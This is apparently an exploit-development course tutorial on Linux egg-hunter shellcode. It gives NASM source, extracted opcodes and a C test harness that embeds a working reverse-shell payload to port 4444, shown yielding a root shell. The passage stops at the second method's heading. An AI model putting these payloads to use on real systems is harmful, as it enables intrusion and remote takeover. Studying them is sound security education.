# Egg Hunting #

Definition. Following the [fantastic document](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) created by Skape:

*`It’s primarily useful for exploitation. Some exploit vectors only allowthe attacker a very small amount of data to use when accomplishing their bufferoverflow. For instance, the Internet Explorer object type vulnerability andthe Subversion date parsing vulnerability are both examples of overflows thatallow for a limited amount of data to be written and used as a payload at adeterministic location. However, both exploits allow for the attacker to placea large payload somewhere else in the address space of the process, thoughthe location that it is stored at is indeterminate.  In the case of the objecttype vulnerability, an attacker can place their egg somewhere else in the HTMLfile, which in the end is translated into a heap allocated buffer that stores thecontents of the page being processed.`*

In simple words, the Egg Hunting technique allows us to create a relatively short shellcode (~ 30/40), whose task is to search the memory (stack, heap, ...) in search of the original, long shellcode, which in normal conditions could not be used due to space restriction.

To this end, so-called tags are used, which is a string that will "point" to the beginning of the actual shellcode that immediately follows them.

Due to the speed of today's processors, the memory search process is rapid and almost imperceptible during exploitation.

In this article, I will try to describe the process of creating three different Egg Hunters listed in the Skapes document, namely:
- access #1
- access #2
- sigaction

### Access #1 ###

The simplest idea of egg hunting can be understood on a practical example. We'll start with the first method described by Skape using access () system call. It is used to verify whether a given process has permissions in the system to access the file on the filesystem.
As arguments, he takes only one value (the second in our case can be zero):
```sh
int (access const char * pathname, int mode);
```
It is also very important that the method does not perform any write operations, which could be very dangerous when searching the entire memory for the tag.

Here is the full Egg Hunter code, with explanatory comments.
```nasm
; Filename: 	egghunting.nasm
; Author:	Jakub Heba
; Purpose:	SLAE Course & Exam 

global _start			

section .text
_start:

	mov ebx, 0x50905090		; Our TAG

	xor ecx, ecx			; ECX cleaning
	mul ecx				; EAX and EDX cleaning

loop:
	or dx, 0xfff			; 4096 bytes for iteration

iteration:
	inc edx				; EDX is incremented

	pusha				; Pushing all general purpose registers on the stack, to prevent eg. EAX value from changing during syscall
	lea ebx, [edx+0x4]		; Putting EDX + 4 bytes into the EBX, for preparing to the syscall (EBX is the first argument)

	mov al, 0x21			; syscall defining (#define __NR_access 33)
	int 0x80			; syscall execution, return value stored in EAX
	
	cmp al, 0xf2			; comparing the return value with 0xf2, which means, that if syscall returns an EFAULT error, Zero Flag is set
	
	popa				; popping all general purpose registers from the stack
	
	jz loop				; If comparing returns True (EFAULT error, ZF set), next 4096 bytes of memory, and next iteration

	; Here, we are looking for the TAG in this part of memory	
	cmp [edx], ebx			; Check, that EDX points to our TAG value, and set ZF, if true
	
	jnz iteration			; If ZF is not set, JMP to the INC instruction and repeat the process
	
	cmp [edx+0x4], ebx		; Check, that we have our second TAG value, to prevent from mistakes
						
	jnz iteration			; If ZF is not set, JMP to the INC instruction and repeat the process, otherwise, eggs are found
	
	jmp edx				; JMP directly to the right Shellcode
```
After saving, we compile, link, and put the resulting shellcode into a wrapper written in the C language.
```sh
$ ./compile.sh egghunting
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!

$ objdump -d ./egghunting|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2"
```
Contents of the shellcode.c file. To facilitate the "editing" of the tag, I placed it in a variable, which then occurs once in the shellcode we have just generated, and twice in the "large" shellcode, as a kind of marker "SHELLCODE BEGINS AFTER THE TAGS".
```c
#include<stdio.h>
#include<string.h>

#define TAG "\x90\x50\x90\x50"

// Out short Egg Hunter with one TAG:
unsigned char egghunter[] = \
"\xbb" TAG "\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

// Large shellcode with 2x TAGs:
unsigned char code[] = \
TAG TAG \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80";


main()
{

	printf("Egghunter Length: %d\n", strlen(egghunter));
	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
```
Compilation and execution of Egg Hunter.
```sh
$ ./shellcode 
Egghunter Length: 39
Shellcode Length:  110
```
Second terminal:
```sh
$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 45794)
whoami
root
```

**Pwned.**

### Access #2 ###
